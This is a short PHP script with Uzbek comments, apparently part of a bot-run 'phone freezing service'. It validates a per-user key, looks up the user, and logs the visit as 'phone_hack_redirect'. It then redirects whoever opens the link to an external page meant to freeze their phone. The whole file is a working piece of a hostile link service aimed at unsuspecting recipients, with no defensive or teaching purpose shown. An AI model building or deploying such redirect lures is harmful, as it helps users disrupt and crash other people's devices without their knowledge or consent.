<?php
// api8.php - Telefon qotirish xizmati
require_once __DIR__ . '/config.php';

// Kalitni tekshirish
$key = isset($_GET['id']) ? trim($_GET['id']) : '';
if ($key === '') {
    http_response_code(404);
    exit("404 Not Found");
}

$chat_id = getUserFromKey($key);
if (!$chat_id) {
    http_response_code(404);
    exit("404 Not Found - Invalid or expired key");
}

$pdo = getDB();
$stmt = $pdo->prepare("SELECT * FROM users WHERE chat_id = ?");
$stmt->execute([$chat_id]);
$user = $stmt->fetch(PDO::FETCH_ASSOC);
if (!$user) {
    http_response_code(404);
    exit("404 Not Found");
}

// Faollikni log qilish
logActivity($chat_id, 'phone_hack_redirect', "Telefon qotirish sahifasiga yo'naltirildi");

// Avtomatik ravishda cznull.github.io ga yo'naltirish
header("Location: https://cznull.github.io");
exit;
?>